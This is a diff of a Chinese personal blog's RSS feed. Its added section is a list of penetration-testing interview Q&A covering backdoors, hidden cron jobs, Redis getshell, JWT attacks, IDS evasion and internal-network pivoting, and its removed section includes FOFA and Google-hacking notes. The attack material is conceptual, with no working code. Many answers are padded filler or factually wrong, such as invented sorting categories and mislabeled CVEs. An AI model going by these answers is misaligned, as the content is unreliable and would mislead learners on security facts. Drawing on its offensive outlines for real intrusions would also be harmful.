+<p>内排序：冒泡排序、插入排序、选择排序、希尔排序、归并排序、快速排序、堆排序等。</p>
+<p>外排序：外部排序（外部排序）、记录聚合排序（记录聚合排序）、桶子排序（桶子排序）、文件合并排序（文件合并排序）等。</p>
+<p>我了解的排序算法有：冒泡排序、插入排序、选择排序、快速排序、希尔排序、归并排序、堆排序、桶排序、记录聚合排序和外部排序。</p>
+<h2>SSRF 漏洞利用?</h2>
+<p>SSRF 漏洞利用是一种攻击技术，它利用服务器端请求伪造（Server Side Request Forgery）漏洞，允许攻击者构造特殊的 HTTP 请求，从而访问内部网络上的服务器资源。攻击者可以利用 SSRF 漏洞来获取内部网络上的敏感信息，甚至可以控制内部网络上的服务器。</p>
+<h2>常见后门方式?</h2>
+<ol>
+<li>后门程序：攻击者可以在系统中安装后门程序，以便获取系统的访问权限。</li>
+<li>后门账号：攻击者可以创建一个后门账号，以便获取系统的访问权限。</li>
+<li>后门服务：攻击者可以在系统中安装后门服务，以便获取系统的访问权限。</li>
+<li>后门端口：攻击者可以在系统中打开一个后门端口，以便获取系统的访问权限。</li>
+<li>后门文件：攻击者可以在系统中创建一个后门文件，以便获取系统的访问权限。</li>
+<li>后门网络：攻击者可以在系统中创建一个后门网络，以便获取系统的访问权限。</li>
+<li>后门脚本：攻击者可以在系统中创建一个后门脚本，以便获取系统的访问权限。</li>
+<li>后门程序替换：攻击者可以在系统中替换一个后门程序，以便获取系统的访问权限。</li>
+</ol>
+<h2>open basedir 访问目录限制绕过方法?</h2>
+<ol>
+<li>利用 open_basedir 的绝对路径：攻击者可以利用 open_basedir 的绝对路径来绕过 open_basedir 的限制，从而访问系统上的其他目录。</li>
+<li>利用 open_basedir 的相对路径：攻击者可以利用 open_basedir 的相对路径来绕过 open_basedir 的限制，从而访问系统上的其他目录。</li>
+<li>利用 open_basedir 的路径穿越：攻击者可以利用 open_basedir 的路径穿越来绕过 open_basedir 的限制，从而访问系统上的其他目录。</li>
+<li>利用 open_basedir 的路径枚举：攻击者可以利用 open_basedir 的路径枚举来绕过 open_basedir 的限制，从而访问系统上的其他目录。</li>
+<li>利用 open_basedir 的路径替换：攻击者可以利用 open_basedir 的路径替换来绕过 open_basedir 的限制，从而访问系统上的其他目录。</li>
+</ol>
+<h2>PHP 代码审计中容易出问题的点?</h2>
+<ol>
+<li>数据库查询：SQL 注入、跨站脚本攻击（XSS）、远程文件包含（RFI）等。</li>
+<li>文件上传：文件上传漏洞、文件包含漏洞等。</li>
+<li>权限控制：越权访问、未授权访问等。</li>
+<li>数据传输：数据加密、数据签名等。</li>
+<li>网络安全：网络攻击、恶意代码等。</li>
+<li>系统安全：系统漏洞、恶意程序等。</li>
+<li>其他：缓冲区溢出、路径遍历攻击等。</li>
+</ol>
+<h2>红蓝对抗中蓝队反杀红队场景和姿势?</h2>
+<p>钓鱼、蜜罐、蚁剑 RCE</p>
+<h2>linux 计划任务，黑客隐藏自己的计划任务会怎么做?</h2>
+<ol>
+<li>使用 crontab -e 命令编辑 crontab 文件，将计划任务添加到文件中，但不要使用明文，而是使用加密的形式，如 base64 编码。</li>
+<li>将计划任务放在一个隐藏的文件夹中，并且给文件夹设置一个隐藏的名字，以防止其他人发现。</li>
+<li>使用 Linux 的隐藏文件功能，将计划任务文件设置为隐藏文件，以防止其他人发现。</li>
+<li>使用 Linux 的文件权限功能，将计划任务文件设置为只读，以防止其他人修改。</li>
+<li>使用 Linux 的文件属性功能，将计划任务文件设置为不可见，以防止其他人发现。</li>
+<li>使用 Linux 的文件系统加密功能，将计划任务文件加密，以防止其他人破解。</li>
+<li>使用 Linux 的隐藏进程功能，将计划任务进程设置为隐藏，以防止其他人发现。</li>
+<li>使用 Linux 的隐藏端口功能，将计划任务端口设置为隐藏，以防止其他人发现。</li>
+<li>使用 Linux 的隐藏网络功能，将计划任务网络设置为隐藏，以防止其他人发现。</li>
+<li>使用 Linux 的隐藏文件系统功能，将计划任务文件系统设置为隐藏，以防止其他人发现。</li>
+</ol>
+<h2>Redis 未授权常见 getshell 的几种方式?</h2>
+<ol>
+<li>利用 Redis 未授权访问漏洞，通过写入 webshell 的方式获取远程控制；</li>
+<li>将 webshell 文件上传到 Redis 服务器，然后在 Redis 中读取文件内容；</li>
+<li>利用 Redis 未授权访问漏洞，通过在 Redis 服务器执行任意命令，获取远程控制；</li>
+<li>利用 Redis 未授权访问漏洞，通过将木马文件作为字符串存入 Redis，然后在 Redis 中调用木马，获取远程控制。</li>
+<li>如果 Redis 启用了 RDB 模式备份功能，可以将 webshell 文件隐藏在备份文件中，然后在 Redis 中读取文件内容；</li>
+<li>如果 Redis 启用了 AOF 模式持久化功能，可以将 webshell 文件作为执行命令写入 AOF 文件，然后在 Redis 中读取文件内容；</li>
+<li>如果 Redis 启用了主从结构，可以将 webshell 文件作为数据传输到从库，然后在 Redis 中读取文件内容。</li>
+<li>如果 Redis 开放了允许客户端执行脚本，可以将 webshell 文件作为脚本传输到 Redis，然后在 Redis 中执行脚本，获取远程控制。</li>
+<li>利用 Redis 消息队列功能，将 webshell 文件作为消息发送到 Redis，然后在 Redis 中读取文件内容。</li>
+<li>如果 Redis 开放了允许客户端使用 EVAL 命令，可以将 webshell 文件作为 LUA 脚本发送到 Redis，执行脚本获取远程控制。</li>
+</ol>
+<h2>JWT 的攻击手法? （头部、负载、签名）</h2>
+<ol>
+<li>利用 JWT 覆盖攻击：利用另一个 JWT 覆盖前一个 JWT，使会话维持在老 JWT 中，而服务器端无法感知到这种覆盖行为，从而给攻击者制造可行性漏洞。</li>
+<li>利用 JWT 加密攻击：由于 JWT 明文保存，因此攻击者可以尝试破解 JWT，盗用令牌，解码并发送请求以访问受保护的资源。</li>
+<li>利用 JWT 篡改攻击：篡改 JWT 中的负荷或头部信息，从而改变请求的内容或范围。</li>
+<li>利用 JWT 负载更新攻击：攻击者通过添加额外的负载到 JWT 中更新它的权限，进而获得无权访问的资源。</li>
+<li>利用 JWT 签名攻击：攻击者可以利用恶意的签名以未经授权的方式令 JWT 可信任，并使用更改的 JWT 来访问应用程序中的保护资源。</li>
+<li>尝试暴力破解：攻击者可以尝试多次猜测和破解 JWT 的密钥，以获取会话令牌。</li>
+<li>生存时间攻击：攻击者可以制造一个 JWT，使其拥有比实际权限过期时间更长的生存时间。</li>
+<li>利用 JWT 缓存攻击：JWT 可能会被缓存在代理服务器或浏览器中，因此攻击者可以从其中获取有效的 JWT。</li>
+<li>利用 JWT 重放攻击：攻击者可以拦截受保护资源的请求，获取 JWT 并重新发送它来获取访问权限。</li>
+<li>利用 JWT 中绝对路径攻击：因为 JWT 可能使用绝对路径而不是相对路径，因此攻击者可以利用这种绝对路径获取更高的权限。</li>
+</ol>
+<h2>JAVA 中间件漏洞举几个例子？</h2>
+<p>1、Apache Tomcat Cipher Transformation Connection 配置不当漏洞（CVE-2015-5351）</p>
+<p>2、Apache Tomcat 反射性文件上传漏洞（CVE-2017-12615）</p>
+<p>3、Apache Tomcat HttpOnly 标记缺失漏洞（CVE-2008-5515）</p>
+<p>4、Apache ActiveMQ 反射性命令执行漏洞（CVE-2015-1830）</p>
+<p>5、Apache Struts2 无效转义漏洞（CVE-2016-3087）</p>
+<p>6、Apache HTTP Server 协议处理不当漏洞（CVE-2016-8743）</p>
+<p>7、IBM WebSphere Application Server LDAP 注入漏洞（CVE-2016-9458）</p>
+<p>8、IBM WebSphere Application Server XFF 头信息泄露漏洞（CVE-2015-2080）</p>
+<p>9、IBM WebSphere Application Server 参数注入漏洞（CVE-2017-1393）</p>
+<p>10、Oracle WebLogic Server 弱口令漏洞（CVE-2018-2628）</p>
+<h2>DNS 外带可以用在哪些漏洞?</h2>
+<p>1、SQL 注入：使用 DNS 外带，攻击者可以读取受保护的服务器上的数据库文件，从而检索有意义的信息。</p>
+<p>2、跨站脚本攻击：攻击者可以利用 DNS 外带，在受害者的浏览器端安装恶意脚本来获得帐号信息。</p>
+<p>3、XML 外部实体攻击：通过 DNS 外带，攻击者可以对受害者的系统进行恶意代码注入，从而让攻击者获得更多权限。</p>
+<p>4、DNS 欺骗/劫持：通过利用 DNS 外带，攻击者可以劫持目标系统的 DNS 解析，将请求重定向到恶意服务器。</p>
+<p>5、XSS 攻击：攻击者可以利用 DNS 外带，将恶意的脚本注入到目标网站中，实施 XSS 攻击。</p>
+<p>6、拒绝服务攻击：攻击者可以利用 DNS 外带来进行拒绝服务攻击，从而对目标系统造成压力。</p>
+<h2>中间件漏洞总结?</h2>
+<ol>
+<li>路由器及路由器 Web 管理界面弱口令漏洞：攻击者可通过暴力破解路由器的 web 管理接口登录密码，窃取路由器的敏感信息；</li>
+<li>系统口令管理漏洞：系统管理员使用默认口令、易猜测口令，使攻击者可以更容易获取系统敏感信息；</li>
+<li>中间件配置不当漏洞：系统管理员可能会将一些敏感信息，如接口配置、接口请求和传输加密等，配置不当，导致攻击者可以接触到这些敏感信息；</li>
+<li>中间件远程服务漏洞：系统管理员可能已开放远程服务，攻击者可以攻击服务，进行暴力破解等；</li>
+<li>中间件反序列化漏洞：在处理反序列化数据时，可能会忽略许多校验步骤，导致攻击者可以构造出恶意的代码；</li>
+<li>中间件 XML 外部实体攻击漏洞：攻击者可以利用 XML 外部实体攻击，通过 XML 解析器对敏感信息进行访问；</li>
+<li>中间件在线应用漏洞：攻击者可能会攻击在线应用，窃取中间件相关敏感信息；</li>
+<li>访问控制不当漏洞：管理员可能会忽略对资源访问的限制，导致攻击者可以访问系统敏感信息；</li>
+<li>中间件不安全编码漏洞：管理员可能会忽略将敏感信息进行加密，导致攻击者可以接触到系统敏感信息；</li>
+<li>中间件调试漏洞：系统管理员可能会不当启用系统调试功能，导致攻击者获取中间件系统信息；</li>
+</ol>
+<h2>谈一谈 Windows 系统与 Linux 系统提权的思路?</h2>
+<p>Windows 系统提权的思路：</p>
+<p>1、利用漏洞：以权限最高的管理员身份登录系统，搜集、利用 Windows 系统存在的漏洞（包括本地漏洞和远程漏洞）进行提权。</p>
+<p>2、利用工具：通过利用一些提权工具（比如 FuzzySecurity 的提权工具），在有权限的状态下也可以对系统进行提权。</p>
+<p>Linux 系统提权的思路：</p>
+<p>1、利用漏洞：类似于 Windows 系统，利用存在的漏洞提权，但是 Linux 系统的漏洞更为严重，更容易提权。</p>
+<p>2、利用工具：类似于 Windows 系统，可以使用脚本和业界发布的各种提权工具，在有权限的状态下也可以对系统进行提权。</p>
+<h2>python 有哪些框架，其中出现过哪些漏洞</h2>
+<p>Python 框架有：Django、Flask、Tornado、Pyramid、Web2py、Bottle、Hug、Cherrypy 等。</p>
+<p>出现过的漏洞有：Django 中的 XML 实体注入漏洞、Flask 中的 Jinja2 模板注入漏洞、Pyramid 中的 XML 实体注入漏洞、Web2py 中的 SSL 加密数据泄露漏洞、Bottle 中的远程代码执行漏洞、Hug 中的路径遍历漏洞等。</p>
+<h2>小程序的渗透和普通渗透的差异</h2>
+<ol>
+<li>小程序渗透的特点是以应用层渗透为主，包括接口安全检测、登录验证、权限控制等，而普通渗透需要依托系统架构，从底层协议层渗透，包括端口拦截、补丁攻击、Web 安全检测、数据库审计等。</li>
+<li>小程序渗透的目的是检测小程序的安全漏洞，以及检测小程序的安全性，而普通渗透的目的是检测系统的安全漏洞，检测系统的行为审计，并检测系统的安全性。</li>
+<li>小程序渗透技术更专注于在应用层进行安全检测，而普通渗透技术主要集中于网络层及以上层的安全检测。</li>
+</ol>
+<h2>app 本身的漏洞测试四大组件</h2>
+<p>1、编译和构建工具：编译和构建工具可以帮助开发人员在特定的硬件平台上编译和构建 android app，这些工具可以在源代码中发现潜在的漏洞，例如：检查未使用的代码，未释放的资源，或者在非安全环境中使用的硬编码值。</p>
+<p>2、应用脱壳：应用脱壳是一种静态分析技术，用于分析应用程序的源代码。它可以检测错误的输入校验，不正确的错误处理，使用未初始化的变量或者其他一些潜在问题。</p>
+<p>3、模拟器：模拟器是一种动态分析技术，可以模拟应用程序在真实设备上的行为，并检测其中的异常情况，比如错误的内存访问，不正确的异常处理等。</p>
+<p>4、测试框架：测试框架是一种结合了静态分析和动态分析的测试方法。它可以让开发者在实施测试前检查应用程序的代码，并可以帮助测试人员运行应用程序，以便检测其中的漏洞。</p>
+<h2>IDS/IPS 防护原理及绕过思路</h2>
+<p>IDS/IPS 防护主要采用常见的静态检测（静态分析）、动态检测和行为分析相结合的方式进行防护。</p>
+<p>静态检测，关注的是恶意行为的特征，如标识性特征、连接特征、结构特征等，通过分析数据包，确认是否存在特定病毒特征，从而检测出病毒攻击。</p>
+<p>动态检测，通过模拟系统环境或模拟病毒运行，观察病毒是否具有攻击性行为，从而判断病毒的攻击性。</p>
+<p>行为分析，通过对网络行为的特征分析，判断是否存在攻击行为，从而判断是否存在病毒攻击。</p>
+<p>绕过 IDS/IPS 防护的方式：</p>
+<ol>
+<li>网络伪装：利用攻击者系统周围的流量作为网络基础设施，改变源地址或目的地址，以此为手段，绕过 IDS/IPS 系统；</li>
+<li>增加数据包长度：攻击者可以利用增大数据包长度，将数据分片后传输，其中恶意数据包可以隐藏在其他数据包中，从而绕过 IDS/IPS 系统的检测；</li>
+<li>使用特殊字符：攻击者可以使用特殊字符，将恶意数据包制作成不常见的特征，以此为手段，绕过 IDS/IPS 系统；</li>
+<li>加密传输：攻击者可以利用加密传输，使恶意数据包在传输过程中不会被 IDS/IPS 系统识别出特征，从而绕过检测和阻断。</li>
+</ol>
+<h2>json 的 csrf 的利用</h2>
+<p>CSRF 是跨站请求伪造，是一种攻击，它利用用户已经登录一个网站的信任，诱使用户执行其不希望执行的操作。JSON 程序也可以被 CSRF 攻击。受害者在不知情的情况下，随意访问了攻击者准备好的 JSON 网页，从而将受害者的合法操作，变成了攻击者的非法操作。</p>
+<p>要防止跨站请求伪造攻击，可以采取一些防御措施，比如在每个 JSON 请求中添加一个 CSRF 令牌，在每个请求头中添加一个 Referer 头来确认请求发起者的网站，在 JSON 客户端中添加一个安全令牌，启用 HTTPOnly 来防止 JSON 反序列化注入，编写坚固的代码来限制 JSON 请求的数量，以及启用内网环境的安全控制等。</p>
+<h2>json 格式的数据包可以测哪些漏洞</h2>
+<p>JSON 格式数据包可以测试服务端脚本注入漏洞、SQL 注入漏洞、XML 外部实体注入漏洞、XXE 漏洞、PATH 注入漏洞、反射性 XSS 漏洞、存储性 XSS 漏洞等多个漏洞。</p>
+<h2>内网服务器，如何进行信息收集?</h2>
+<ol>
+<li>通过搜索引擎进行信息收集：使用 Google，Bing 等搜索引擎可以搜索到有关内网服务器的信息；</li>
+<li>通过 Whois 查询进行信息收集：Whois 查询可以查询出有关内网服务器的 IP 地址，所有者信息等；</li>
+<li>利用 Netcraft 等网络调查公司的网站进行信息收集：Netcraft 等网络调查公司的网站可以查询出有关内网服务器的 IP 地址，操作系统版本，服务器类型等；</li>
+<li>通过端口扫描程序进行信息收集：端口扫描程序可以查询出内网服务器的打开的端口，确定服务器运行的程序；</li>
+<li>通过漏洞扫描程序进行信息收集：漏洞扫描程序可以查询内网服务器是否存在安全漏洞，确定服务器的漏洞情况；</li>
+<li>通过抓包工具进行信息收集：抓包工具可以抓取服务器的网络数据包，查看服务器的运行情况。</li>
+</ol>
+<h2>如果拿下了内网边界层的某一个阿机器，如何对内网其他进行探测?</h2>
+<ol>
+<li>首先，应该分析获取到的内网机器，获取机器上的操作系统和硬件配置，以及安装的软件，以最大限度地发挥其作为内网攻击者的优势。</li>
+<li>然后，应运行一些工具来发现周围的主机，启用内网中所有可用的端口，并查看他们提供的服务，以及对其他服务的响应。</li>
+<li>通过扫描可用的 IP 地址空间，可以识别出另一台计算机的存在，并且可以判断这台机器的类型。</li>
+<li>尝试连接到内网中的其他计算机，以及尝试登录内网中其他计算机的系统上的用户帐户。</li>
+<li>尝试执行一些像病毒和木马程序这样的恶意软件，以便攻击内网中的其他计算机。</li>
+<li>在目标内网中发起一系列攻击，以获取有用的信息，如可以用来访问系统或网络的凭据，或用于提升权限的突破点。</li>
+<li>最后，应该尝试利用获取的信息来攻击内网中的其他计算机，以获取有效的信息和权限。</li>
+</ol>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>生活杂谈</title>
       <link>https://min168.top/com/</link>
       <guid>https://min168.top/com/</guid>
-      <source url="https://min168.top/rss.xml">热💖生活</source>
-      <description>pnpm docs:dev 2e5k 是爬山虎吗？ 39g9 深蓝海面 ck51 海与石 ha6t 草坪铁轨 orwp 雪天树枝 vii9 阿布吉措 zqia 夕阳 1evs 水面落羽衫 3tnq 夕阳 79dt 湖光秋色 dk1d 海与礁石 kej7 建筑 pnci 爬山虎 t113 欧洲小镇 w404 欧洲小镇 zvq4 气球 w015 海鸥 1s...</description>
+      <source url="https://min168.top/rss.xml">生活杂谈</source>
+      <description>pnpm docs:dev</description>
       <pubDate>Mon, 27 Jan 2025 14:53:53 GMT</pubDate>
       <content:encoded><![CDATA[<p>pnpm docs:dev</p>
-<div class="masonry-grid">
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">是爬山虎吗？</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">深蓝海面</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">海与石</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">草坪铁轨</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">雪天树枝</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">阿布吉措</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">夕阳</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">水面落羽衫</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">夕阳</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">湖光秋色</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">海与礁石</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">建筑</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">爬山虎</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">欧洲小镇</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">欧洲小镇</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">气球</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">海鸥</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">深色大海</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">海边波浪</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">森林草坪</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">冬日桃花</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">欧式建筑</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">不知道什么鸟</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">香格里拉</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">海滩</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">日照金山</div>
-  </div>
-  <div class="masonry-item">
-    
-    <div class="masonry-caption">牦牛坪</div>
-  </div>
-</div>
-<h3>永远阳光，永远积极向上🥰</h3>
 ]]></content:encoded>
+    </item>
+    <item>
+      <title>职业素养💼</title>
+      <link>https://min168.top/com/job/</link>
+      <guid>https://min168.top/com/job/</guid>
+      <source url="https://min168.top/rss.xml">职业素养💼</source>
+      <pubDate>Mon, 27 Jan 2025 14:53:53 GMT</pubDate>
     </item>
     <item>
       <title>学习云计算基本理论学习笔记</title>
@@ -13661,682 +14841,6 @@ git config --global user.email 'xxx@163.com'</p>
 <span class="line"><span>git commit -m "update .gitignore"  // windows使用的命令时，需要使用双引号</span></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
       <enclosure url="https://img2020.cnblogs.com/blog/1158910/202107/1158910-20210715220241440-392288054.png" type="image/png"/>
-    </item>
-    <item>
-      <title>FOFA搜索引擎高级语法与使用技巧</title>
-      <link>https://min168.top/perm/FOFA%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7.html</link>
-      <guid>https://min168.top/perm/FOFA%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7.html</guid>
-      <source url="https://min168.top/rss.xml">FOFA搜索引擎高级语法与使用技巧</source>
-      <description>高级搜索 关于建站软件的搜索语法请参考：组件列表 基础类（General） 标记类（Special Label） 协议类 (type=service) 网站类（type=subdomain） 地理位置 证书类 | 时间类（Last update time） | | | | | | | 独立IP语法（独立IP系列语法，不可和上面其他语法共用） | | |...</description>
-      <category>渗透测试</category>
-      <pubDate>Tue, 10 Jan 2023 00:00:00 GMT</pubDate>
-      <content:encoded><![CDATA[<p>高级搜索</p>
-<p>| 逻辑连接符 | 具体含义                                                                           |<br>
-|</p>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>Google Hacking搜索引擎黑客技术实战</title>
-      <link>https://min168.top/perm/Google%20Hacking%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html</link>
-      <guid>https://min168.top/perm/Google%20Hacking%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html</guid>
-      <source url="https://min168.top/rss.xml">Google Hacking搜索引擎黑客技术实战</source>
-      <description>一、基础语法 加号（“+”）：加号表示强制搜索，即搜索结果中必须包含加号后面的内容。例如，“谷歌 +搜索引擎”会搜索到同时包含“谷歌”和“搜索引擎”的结果。 减号（“-”）：减号表示排除搜索，即搜索结果中不包含减号后面的内容。例如，“谷歌 -搜索引擎”会搜索到包含“谷歌”但不包含“搜索引擎”的结果。 波浪号（“~”）：波浪号表示搜索同义词或近义词，从而...</description>
-      <category>渗透测试</category>
-      <pubDate>Thu, 23 Feb 2023 00:00:00 GMT</pubDate>
-      <content:encoded><![CDATA[<h3>一、基础语法</h3>
-<ol>
-<li>加号（“+”）：加号表示强制搜索，即搜索结果中必须包含加号后面的内容。例如，“谷歌 +搜索引擎”会搜索到同时包含“谷歌”和“搜索引擎”的结果。</li>
-<li>减号（“-”）：减号表示排除搜索，即搜索结果中不包含减号后面的内容。例如，“谷歌 -搜索引擎”会搜索到包含“谷歌”但不包含“搜索引擎”的结果。</li>
-<li>波浪号（“~”）：波浪号表示搜索同义词或近义词，从而扩大搜索范围。例如，“谷歌 ~搜索引擎”可能会搜索到与“谷歌”和“搜索引擎”相关的同义词或近义词结果。</li>
-<li>点号（“.”）：点号可以作为单一字符的通配符，用于替代某个字符。例如，“war.3”可能会搜索到包含“war”后接一个任意字符再后接“3”的结果。</li>
-<li>星号（“”）：星号可以作为多个字符的通配符，用于替代任意数量的字符。例如，“war”可能会搜索到所有以“war”开头的单词或短语。</li>
-<li>双引号（“”）：双引号用于精确匹配搜索，即搜索结果必须完全包含双引号内的内容，且顺序一致。例如，“谷歌搜索引擎”会搜索到完全包含这四个字且顺序不变的结果。</li>
-</ol>
-<h3>二、高级语法</h3>
-<ol>
-<li>allintext/intext：用于<span data-type="text" style="color: var(--b3-font-color8);">搜索网页正文中包含特定关键字</span>的内容。allintext可以接多个关键字，而intext通常用于单个关键字的搜索。例如，“allintext:谷歌 搜索引擎”会搜索到网页正文中同时包含“谷歌”和“搜索引擎”的结果。</li>
-<li>allintitle/intitle：用于<span data-type="text" style="color: var(--b3-font-color8);">搜索网页标题中包含特定关键字</span>的内容。allintitle可以接多个关键字，而intitle通常用于单个关键字的搜索。例如，“allintitle:谷歌 学术”会搜索到网页标题中同时包含“谷歌”和“学术”的结果。</li>
-<li>cache：用于搜索已经删除的缓存网页。例如，“cache:<a href="http://www.example.com" target="_blank" rel="noopener noreferrer">http://www.example.com</a>”会尝试搜索并展示www.example.com的缓存版本（如果可用）。</li>
-<li>define：用于查询某个词语的定义。例如，“define:谷歌”会搜索到“谷歌”的定义或相关解释。</li>
-<li>filetype：用于搜索指定格式的文件。例如，“filetype:pdf 谷歌”会搜索到所有以“谷歌”为关键字且格式为PDF的文件。</li>
-<li>info：用于查询指定网站的摘要信息和其他相关信息。例如，“info:<a href="http://www.example.com" target="_blank" rel="noopener noreferrer">http://www.example.com</a>”会搜索到www.example.com的摘要信息。</li>
-<li>inurl：用于<span data-type="text" style="color: var(--b3-font-color8);">搜索包含特定URL关键字</span>的网页。例如，“inurl:login”会搜索到所有URL中包含“login”的网页。</li>
-<li>link：用于查看与指定网站链接的其他网站。例如，“link:<a href="http://www.example.com" target="_blank" rel="noopener noreferrer">http://www.example.com</a>”会搜索到所有与www.example.com有链接关系的网站。</li>
-<li>related：用于搜索与指定网站结构或内容类似的其他网站。例如，“related:<a href="http://www.example.com" target="_blank" rel="noopener noreferrer">http://www.example.com</a>”会搜索到与www.example.com类似的其他网站。</li>
-<li>site：用于指定<span data-type="text" style="color: var(--b3-font-color8);">搜索结果的网站范围</span>。例如，“site:<a href="http://www.example.com" target="_blank" rel="noopener noreferrer">http://www.example.com</a>”会搜索到www.example.com网站内的所有内容。</li>
-</ol>
-<h3>三、具体示例：</h3>
-<p>| 命令                                                                                                                                                                                    | 释义                                                                                           |<br>
-|</p>
-]]></content:encoded>
-    </item>
-    <item>
-      <title>MSSQL注入漏洞深度复盘与实战</title>
-      <link>https://min168.top/perm/MSSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</link>
-      <guid>https://min168.top/perm/MSSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</guid>
-      <source url="https://min168.top/rss.xml">MSSQL注入漏洞深度复盘与实战</source>
-      <description>MSSql MSSql是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其 中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server默认开放的端口是TCP1433。 渗透角度介绍MSSql Microsoft SQL Sever分为很多个版本，随着版本的不断升级安...</description>
-      <category>渗透测试</category>
-      <pubDate>Wed, 06 Sep 2023 00:00:00 GMT</pubDate>
-      <content:encoded><![CDATA[<h2>MSSql</h2>
-<p>MSSql是指<span data-type="text" style="color: var(--b3-font-color8);">微软的SQLServer</span>数据库服务器，<span data-type="text" style="color: var(--b3-font-color8);">它是一个数据库</span>平台，提供数据库的从服务器到终端的完整的解决方案，其<br>
-中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server默认开放的端口是TCP1433。</p>
-<h2>渗透角度介绍MSSql</h2>
-<p>Microsoft SQL Sever分为很多个版本，随着版本的不断升级安全性也越来越高，渗透过程中最喜欢的版本应该就是<br>
-2008以前，<span data-type="text" style="color: var(--b3-font-color8);">在2008及其以后的版本数据库的权限已经不再是system</span>,相对于MySQL这个MSSql显得强大许多，他众多的功<br>
-能也给我们注入过程带来了便利，所以一般数据库为mssql支持多语句我们就考虑是不是应该直接拿下webshell。</p>
-<h2>MSSql视图和表</h2>
-<h3>表与视图区别？</h3>
-<p>表是存在物理记录的集合，而视图只是一串sq脚本;</p>
-<p>表需占用物理空间，而视图理论上可以不占用物理空间;</p>
-<p>视图可以将多个表呈现给用户，而表只可以呈现自身;</p>
-<p>视图可以随意删除和重建，而表的删除会导致数据丢失;</p>
-<h3>表与视图之间的联系？</h3>
-<p><span data-type="text" style="color: var(--b3-font-color9);">视图是建立在表的基础之上的</span>一种结构视图中的数据可以来源于多张表;</p>
-<p>表是实际存在的不依附视图;</p>
-<p>使用视图可以增强表的安全性;</p>
-<p>数据表是真实存在的，有效数据，视图相当于固定的5q语句，当打开视图就行其$q语句。视图多为几个表的关系联合表达。有助于封装复杂的关系。</p>
-<h3>MSSql的默认库</h3>
-<p>SQL Servers安装4个系统数据库。它们分别是master数据库、model数据库、tempdb数据库和msdb数据库。这些数据库是<br>
-SQL Server的心脏和灵魂。</p>
-<ul>
-<li><span data-type="text" style="color: var(--b3-font-color8);">master</span>数据库（重要）：master数据库控制SQL Server的所有方面。这个数据库中包括所有的<span data-type="text" style="color: var(--b3-font-color8);">配置信息、用户登录信息</span>、当<br>
-前正在服务器中运行的<span data-type="text" style="color: var(--b3-font-color8);">过程的信息</span>。</li>
-<li><span data-type="text" style="color: var(--b3-font-color8);">model</span>数据库：model数据库是建立所有用户数据库时的模板。当建立一个新数据库时，SQL Servers会把model数据库中的所<br>
-有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填<br>
-满。</li>
-<li><span data-type="text" style="color: var(--b3-font-color8);">tempdb</span>数据库：这个库用来<span data-type="text" style="color: var(--b3-font-color8);">保存所有的临时表</span>、存储过程和其他SQL Server建立的临时用的东西。</li>
-<li><span data-type="text" style="color: var(--b3-font-color8);">msdb</span>数据库：由Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异<br>
-常信息。</li>
-</ul>
